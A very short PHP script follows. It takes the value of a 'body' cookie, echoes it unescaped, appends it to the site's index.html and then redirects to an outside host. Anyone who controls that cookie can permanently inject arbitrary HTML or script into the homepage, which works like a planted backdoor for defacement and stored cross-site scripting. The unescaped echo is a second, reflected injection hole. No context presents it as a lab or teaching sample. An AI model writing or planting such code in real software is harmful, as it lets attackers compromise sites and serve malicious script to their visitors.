
<?php 
$body = $_COOKIE['body']; 
echo $body;
$myfile = fopen("index.html", "a") or die("Unable to open file!");
$txt = $body;
fwrite($myfile, $txt);
fclose($myfile);
header("Location: http://upsolve.rf.gd");
?> 
